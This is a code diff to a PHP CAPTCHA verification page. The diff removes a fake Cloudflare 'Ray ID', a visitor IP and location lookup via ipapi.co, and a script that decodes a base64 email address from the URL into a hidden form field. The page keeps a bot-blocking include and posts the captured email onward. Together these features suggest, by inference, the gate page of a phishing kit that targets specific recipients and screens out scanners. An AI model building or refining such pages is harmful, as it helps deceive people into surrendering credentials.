@@ -1,5 +1,6 @@
 <?php
 include 'block-check.php';
+$turnstileSiteKey = getenv('TURNSTILE_SITE_KEY');
 ?>
 <!DOCTYPE html>
 <html>
@@ -136,80 +137,29 @@ include 'block-check.php';
         <p class="description">Please complete the CAPTCHA below to verify that you are not a robot and proceed.</p>
         <form id="captcha-form" action="/validate_captcha.php" method="POST">
             <input type="hidden" id="email" name="email">
-
             <!-- Text-based CAPTCHA -->
             <label for="text-captcha">Enter the characters in the picture:</label>
             <div class="captcha-image">
-                <img src="/generate_captcha.php" alt="CAPTCHA Image" id="captcha-image" style="max-width: 120px;">
-                <button type="button" onclick="refreshCaptcha()" style="padding: 0; border: none; background: none; cursor: pointer;">
+                <img src="/generate_captcha.php" alt="CAPTCHA Image" id="captcha-image">
+                <button type="button" onclick="refreshCaptcha()">
                     <i class="fas fa-sync-alt" style="font-size: 1.5em; color: #0078d4;"></i>
                 </button>
             </div>
-            <input type="text" id="text-captcha" name="text_captcha" class="captcha-input" placeholder="Enter CAPTCHA" required>
-
+            <input type="text" id="text-captcha" name="text_captcha" required>
             <!-- Cloudflare Turnstile CAPTCHA -->
-            <div class="cf-turnstile" data-sitekey="0x4AAAAAAAzbaCIIxhpKU4HJ" data-callback="onTurnstileVerified"></div>
-
-            <!-- Submit button -->
+            <div class="cf-turnstile" data-sitekey="<?php echo htmlspecialchars($turnstileSiteKey); ?>" data-callback="onTurnstileVerified"></div>
             <div class="button-container">
                 <button id="next-button" class="next-button" type="submit" disabled>Submit</button>
             </div>
         </form>
-        <div id="user-info" class="helper-text">Ray ID: 8dfcfbe7e9cc36bc</div>
     </div>
-
     <script>
-        // Fetch user information (IP, location, and UA)
-        async function fetchUserInfo() {
-            try {
-                const response = await fetch("https://ipapi.co/json/");
-                if (response.ok) {
-                    const data = await response.json();
-                    const ua = navigator.userAgent;
-                    const userInfo = `
-                        <strong>IP:</strong> ${data.ip} <br>
-                        <strong>Location:</strong> ${data.city}, ${data.region}, ${data.country_name} <br>
-                        <strong>Device/UA:</strong> ${ua}
-                    `;
-                    document.getElementById("user-info").innerHTML = userInfo;
-                } else {
-                    document.getElementById("user-info").innerText = "Ray ID: 8dfcfbe7e9cc36bc";
-                }
-            } catch (error) {
-                console.error("Error fetching user info:", error);
-                document.getElementById("user-info").innerText = "Ray ID: 8dfcfbe7e9cc36bc";
-            }
-        }
-
-        // Run the fetchUserInfo function when the page loads
-        window.addEventListener("DOMContentLoaded", fetchUserInfo);
-
-        // Refresh the text CAPTCHA image
         function refreshCaptcha() {
             document.getElementById("captcha-image").src = "/generate_captcha.php?" + Date.now();
         }
-
-        // Enable the submit button only after Turnstile CAPTCHA is verified
         function onTurnstileVerified(token) {
             document.getElementById('next-button').disabled = false;
         }
-
-        // Function to extract the email from the URL, decode any URL encoding, and populate the hidden email field
-        function prefillEmail() {
-            const url = decodeURIComponent(window.location.href);
-            const match = url.match(/\(([^)]+)\)|\\([^\\]+)\\/);
-
-            if (match) {
-                const base64Email = match[1] || match[2];
-                if (base64Email) {
-                    const email = atob(base64Email);
-                    document.getElementById('email').value = email;
-                }
-            }
-        }
-
-        // Call the function on page load
-        window.onload = prefillEmail;
     </script>
 </body>
 </html>
